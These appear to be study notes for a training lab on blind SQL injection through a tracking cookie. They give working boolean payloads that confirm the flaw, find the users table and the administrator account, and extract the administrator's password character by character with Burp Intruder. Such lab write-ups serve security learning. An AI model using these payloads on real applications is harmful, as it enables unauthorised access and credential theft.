Lab #11 - Blind SQL Injection with conditional responses

Vulnerable parameter - Tracking Cookie

End Goals:

- Enumerate the password of administrator
- Login as administrator user

Analysis:

1. Confirm that the parameter is vulnerable to blind sqli

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes'

- If the tracking id exists => query returns value => Welcome back
- If it doesn't exist => query returns nothing => no Welcome back

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and 1=1--' -> ```True``` -> _Welcome back_

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and 1=2--' -> _False_ -> _no Welcome back_

2. Confirm that we have a users table

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select 'x' from users LIMIT 1)='x'-- ' -> _if users table exists_ -> _True_ -> _Welcome back_ ==> users table exists

3. Confirm username administrator exists in users table

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select username from users where username='administrator')='administrator'-- ' -> _if username administrator exists_ -> _True_ -> _Welcome back_ ==> user administrator exists

4. Enumerate password for the administrator user

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select username from users where username='administrator' and LENGTH(password)>=1)='administrator'-- ' ==> _length of password is 20_

select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select substring(password,1,1) from users where username='administrator')='a'-- ' ==> _gives the administrator's password_ [with the help of intruder(burp)]
